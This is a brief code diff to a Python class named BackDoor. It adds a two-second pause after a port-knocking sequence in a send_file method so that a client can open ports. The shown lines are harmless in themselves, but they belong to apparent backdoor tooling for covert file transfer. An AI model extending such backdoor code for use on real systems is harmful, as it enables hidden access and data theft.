@@ -225,6 +225,9 @@ class BackDoor:
     def send_file(self):
         print(f"sending {self.path}")
         self.port_knock()
+        # Give time for client to open ports
+        time.sleep(2)
+
 
     def port_knock(self):
         for i in self.sequence:
